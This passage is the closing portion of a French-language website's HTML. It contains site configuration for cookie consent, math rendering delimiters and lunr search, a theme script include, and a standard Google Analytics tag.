statistiques."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"fr","maxResultLength":10,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-TRE4WGVY4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-TRE4WGVY4F');
</script></body>
</html>
